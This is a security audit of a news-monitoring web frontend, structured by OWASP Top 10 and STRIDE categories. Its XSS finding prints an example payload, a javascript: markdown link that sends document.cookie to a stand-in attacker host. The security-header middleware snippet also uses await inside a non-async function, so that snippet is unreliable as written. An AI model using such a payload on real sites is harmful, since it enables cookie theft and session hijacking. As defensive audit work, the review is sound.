STRUCTURED SECURITY REVIEW — CyberNews Frontend
Methodology: OWASP Top 10 (2021) + Threat Modelling (STRIDE)
Date: 2026-06-09
Scope: /frontend (Astro SSR, React components, PostgreSQL via pg)
================================================================================

THREAT MODEL OVERVIEW
---------------------
Application type : Server-Side Rendered web app (Astro + Node)
Data sensitivity : HIGH — cybersecurity intelligence, CVE data, CISA KEV flags,
                   monitored application lists, operational feed metadata
Trust boundaries : Browser <-> Astro SSR server <-> PostgreSQL database
                   RSS feeds -> Worker -> Database -> Frontend
External inputs  : URL parameters, AI-generated Markdown (summary.content_md),
                   RSS article data (title, url, content, source)
Deployment model : Docker container, port 3000, DATABASE_URL via env var

STRIDE Threat Categories Assessed:
  S - Spoofing       T - Tampering      R - Repudiation
  I - Information    D - Denial of Svc  E - Elevation of Privilege

================================================================================

OWASP A01:2021 — BROKEN ACCESS CONTROL
Risk: CRITICAL
--------------------------------------------------------------------------------
Status: FAILING

There is no access control anywhere in the application. All routes are publicly
accessible:

  /                        → exposes recent articles + CISA KEV/CVSS ≥9.8 alerts
  /security-news           → lists all monitoring profiles
  /security-news/[profile] → full AI summaries, article feed, CVE charts
  /profiles                → exposes profile configs incl. monitored app lists
  /reporting               → operational metrics: feed URLs, article volumes,
                             last fetch times for all RSS sources

STRIDE: Information Disclosure (I), Elevation of Privilege (E)

Specific risks:
  1. An external attacker can enumerate all monitored applications for any
     organisation using this tool, providing reconnaissance value.
  2. The /reporting page reveals RSS source URLs and fetch cadence — an attacker
     could monitor these to understand an organisation's threat intelligence
     sources and potentially interfere with them.
  3. AI-generated summaries of sensitive CVEs are exposed without restriction.

REMEDIATION:
  Implement authentication as the first priority. For a SharePoint-integrated
  deployment, consider Azure AD / Entra ID SSO. At minimum, add HTTP Basic Auth
  at the reverse proxy level until application-level auth is implemented.
  Apply network-level controls: place behind VPN if intended for internal use.

================================================================================

OWASP A02:2021 — CRYPTOGRAPHIC FAILURES
Risk: HIGH
--------------------------------------------------------------------------------
Status: PARTIAL PASS / CONCERN

DATABASE_URL — including username, password, hostname, and database name — is
injected into the Vite build via astro.config.mjs:

  vite: {
    define: {
      "process.env.DATABASE_URL": JSON.stringify(process.env.DATABASE_URL),
    },
  }

Vite's define performs global string substitution across ALL processed modules.
If the pg library or db.ts is ever transitively imported by a client-facing
bundle, the credential string will be baked into the JavaScript payload served
to browsers.

STRIDE: Information Disclosure (I)

No TLS configuration is present in the Astro config, meaning TLS termination
is assumed to happen at a reverse proxy. This is acceptable if confirmed — but
not documented.

REMEDIATION:
  Remove the vite.define block. Astro server-side code accesses process.env
  natively. The define is unnecessary and dangerous. Audit that no component
  with client:load or client:only imports anything from src/lib/db.ts.

================================================================================

OWASP A03:2021 — INJECTION
Risk: HIGH
--------------------------------------------------------------------------------
Status: PARTIAL PASS

SQL Injection — PASS
  All database queries in src/lib/db.ts use parameterised queries ($1, $2 etc.)
  via the pg library. No string interpolation into SQL was found. This is well
  implemented.

XSS (Cross-Site Scripting) — FAIL
  Two XSS injection points identified:

  1. STORED XSS via AI-generated Markdown (HIGH)
     File: src/pages/security-news/[profile].astro ~line 867
     File: src/components/PDFExportButton.tsx ~line 1832

     The markdownToHtml() function converts summary.content_md (stored in DB,
     generated by AI) to HTML via regex, then injects via set:html. The link
     regex does not filter dangerous URL schemes:

       .replace(/\[(.+?)\]\((.+?)\)/g,
         '<a href="$2" target="_blank" rel="noopener">$1</a>')

     Payload: [pwned](javascript:fetch('https://attacker.com?c='+document.cookie))
     Result:  Clickable link that exfiltrates cookies when clicked.

     The same pattern in PDFExportButton writes to document.write() in a new
     window with no Content Security Policy — a higher-risk sink.

  2. REFLECTED / STORED XSS via article URLs (MEDIUM-HIGH)
     Files: index.astro, [profile].astro, Timeline.tsx

       <a href={a.url} target="_blank" rel="noopener">

     If an RSS feed (or a compromised feed) injects a javascript: URL into an
     article's URL field, it will be rendered as a live href. The rel="noopener"
     protects against tab-napping but does NOT prevent javascript: execution.

STRIDE: Tampering (T), Information Disclosure (I)

REMEDIATION:
  For markdown links:
    function safeHref(url: string): string {
      try {
        const p = new URL(url);
        return ['http:','https:'].includes(p.protocol) ? url : '#';
      } catch { return '#'; }
    }
  Apply this before inserting any href from external data.
  Add a Content Security Policy header to block inline script execution.

================================================================================

OWASP A04:2021 — INSECURE DESIGN
Risk: MEDIUM
--------------------------------------------------------------------------------
Status: CONCERN

1. No input validation layer
   URL parameters (tab, view, date, profileSlug) are read with TypeScript
   type assertions that are compile-time only. At runtime, any string can
   arrive. While parameterised queries prevent SQL injection, unvalidated
   inputs create a broader attack surface for logic manipulation.

2. The markdownToHtml function is a hand-rolled converter in security-critical
   context. Hand-rolled HTML generators are a known insecure design pattern —
   they consistently miss edge cases (see Finding A03 above). Use an established
   sanitising library instead.

3. The PDF export opens a new window and writes arbitrary HTML with
   document.write() — a deprecated, unsafe API. There is no sandboxing,
   no CSP on the print window, and the content is not sanitised before write.

STRIDE: Tampering (T), Elevation of Privilege (E)

REMEDIATION:
  Add a validation utility (e.g. using zod, which is already a declared
  dependency in package.json) for all URL parameter parsing. Replace
  document.write() in PDFExportButton with safe DOM construction.

================================================================================

OWASP A05:2021 — SECURITY MISCONFIGURATION
Risk: MEDIUM
--------------------------------------------------------------------------------
Status: FAILING

1. No HTTP security headers configured
   No evidence of the following headers being set:
     Content-Security-Policy      — not set (would mitigate XSS above)
     X-Frame-Options              — not set (clickjacking risk)
     X-Content-Type-Options       — not set
     Referrer-Policy              — not set
     Permissions-Policy           — not set

   For a security intelligence platform, absence of CSP is particularly
   notable given the XSS findings above.

2. Server binds to 0.0.0.0 (astro.config.mjs)
   Acceptable in Docker, but misconfiguration risk if deployed bare-metal.

3. Error handling swallows context silently
   In [profile].astro:
     } catch (e) {
       console.error(e);
       dbError = true;
     }
   Errors are logged to console (server-side only) and a generic error state
   is shown to the user. While this prevents stack trace leakage to the browser
   (good), errors are not surfaced to any monitoring system.

STRIDE: Information Disclosure (I), Denial of Service (D)

REMEDIATION:
  Add Astro middleware to set security headers on all responses:
    // src/middleware.ts
    export const onRequest = defineMiddleware((_, next) => {
      const res = await next();
      res.headers.set('X-Frame-Options', 'DENY');
      res.headers.set('X-Content-Type-Options', 'nosniff');
      res.headers.set('Content-Security-Policy',
        "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
      return res;
    });
  Integrate structured logging (e.g. to a SIEM or log aggregator).

OWASP A06:2021 — VULNERABLE AND OUTDATED COMPONENTS
Risk: LOW (requires verification)
--------------------------------------------------------------------------------
Status: UNABLE TO VERIFY FULLY

Declared dependency versions from package.json:
  astro          ^5.0.0   — Check for CVEs against specific pinned version
  pg             ^8.13.1  — Actively maintained; verify no known CVEs
  chart.js       ^4.4.0   — Actively maintained
  react          ^18.3.0  — Current stable
  zod            ^3.23.8  — Current stable

No package-lock.json was audited for transitive dependency vulnerabilities.
The ^ prefix means semver minor/patch updates are allowed, which could
introduce changes without explicit review.

REMEDIATION:
  Run npm audit in the frontend directory as part of CI/CD. Pin exact versions
  in production (remove ^ prefix from package.json or use --save-exact).
  Consider integrating Dependabot or Renovate for automated dependency updates.

OWASP A07:2021 — IDENTIFICATION AND AUTHENTICATION FAILURES
Risk: CRITICAL
--------------------------------------------------------------------------------
Status: FAILING

No authentication mechanism exists. See A01 above — this is the same root
cause. Users are not identified, sessions do not exist, and there is no
concept of identity in the application.

Additional observations:
  - The read/unread state (Timeline.tsx) uses localStorage — this state is
    browser-local and not tied to any user identity. Any person on the same
    browser can see what has been "read."
  - There are no CSRF tokens (not currently needed without auth, but must be
    added alongside any auth implementation).

STRIDE: Spoofing (S), Elevation of Privilege (E)

================================================================================

OWASP A08:2021 — SOFTWARE AND DATA INTEGRITY FAILURES
Risk: LOW
--------------------------------------------------------------------------------
Status: CONCERN

The PDF export in PDFExportButton.tsx constructs and opens a new HTML document
using document.write() populated with user-controlled content (the summary
markdown). This new document has no Subresource Integrity checks, no CSP, and
loads no external resources — so the risk is contained to the XSS already
noted under A03.

The application's own supply chain (package.json, npm) does not use lockfile
integrity verification beyond what npm provides by default.

================================================================================

OWASP A09:2021 — SECURITY LOGGING AND MONITORING FAILURES
Risk: MEDIUM
--------------------------------------------------------------------------------
Status: FAILING

1. All error handling catches exceptions silently:
     } catch { dbError = true; }   // index.astro — no logging at all
     } catch (e) { console.error(e); dbError = true; }  // [profile].astro

   The first pattern discards the error entirely. Neither pattern sends to a
   centralised log or alerting system.

2. There is no audit trail for:
   - Who accessed what intelligence profiles
   - When articles were fetched and from which feeds
   - Any anomalous query patterns (e.g. parameter fuzzing)

3. The application ingests data from external RSS feeds. If a feed is
   compromised or starts delivering malicious content, there is no alerting
   mechanism to detect this.

STRIDE: Repudiation (R)

REMEDIATION:
  Implement structured logging (e.g. pino) with request context.
  Log all database errors, slow queries, and unusual parameter values.
  Add monitoring alerts for feed anomalies (e.g. sudden spike in CVSS ≥ 9
  articles from a single source).

================================================================================

OWASP A10:2021 — SERVER-SIDE REQUEST FORGERY (SSRF)
Risk: LOW
--------------------------------------------------------------------------------
Status: PASS (no SSRF surface identified in frontend)

The frontend does not make outbound HTTP requests based on user input. All
external data fetching occurs in the worker component (not reviewed here).
The frontend only reads from the PostgreSQL database.

Note: The worker component (which fetches RSS feeds) should be reviewed
separately for SSRF — RSS feed URLs are a classic SSRF vector if user-
configurable.
